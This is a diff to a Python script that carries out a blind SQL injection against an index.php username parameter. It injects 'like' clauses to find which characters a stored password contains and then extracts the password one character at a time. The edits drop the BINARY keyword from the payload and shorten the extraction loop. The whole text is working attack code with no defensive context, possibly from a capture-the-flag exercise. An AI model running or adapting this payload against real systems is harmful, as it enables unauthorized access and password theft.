@@ -10,7 +10,7 @@ password=''
 def findPassChars(): 
     global passwordChars, targetURL, passString 
     for c in alphanumericChars:
-        r = requests.get(targetURL+'/index.php?username=hex"+and+password+like+BINARY+"%'+c+'%' )
+        r = requests.get(targetURL+'/index.php?username=hex"+and+password+like+"%'+c+'%' )
         if passString in r.text:
            passwordChars+= c 
            print ('Password contains character : ' + c)
@@ -19,14 +19,17 @@ def findPassChars():
            
 def findPassword(): 
     global  passwordChars, targetURL, password 
-    for i in range(32): 
+    for i in range(31): 
         for c in passwordChars: 
-             r =requests.get(targetURL+'/index.php?username=hex"+and+password+like+BINARY+"'+ password + c+'%' )
+             r =requests.get(targetURL+'/index.php?username=hex"+and+password+like+"'+ password + c+'%' )
              if passString in r.text: 
                  password += c                
                  print ('Current password evaluation : ' + password) 
+             
+    
+    
 
-           
+          
 print("\n \n \nlet's find the Password character\n \n \n ")
 findPassChars()
 print("\ncharacter password contents : " + passwordChars)
